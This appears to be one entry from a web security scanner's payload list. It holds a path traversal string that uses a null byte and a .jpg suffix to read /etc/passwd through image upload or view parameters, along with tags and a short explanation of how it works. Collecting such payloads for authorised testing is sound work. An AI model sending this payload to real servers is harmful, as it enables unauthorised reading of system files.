{"text": "../../../etc/passwd%00.jpg", "technique": "path_traversal", "databases": ["any"], "contexts": ["url_param"], "waf_bypasses": ["generic"], "severity_boost": 0.78, "explanation": "Null byte with .jpg extension. Variant targeting image upload/view functions that append an extension. The null byte terminates the string before the extension."}
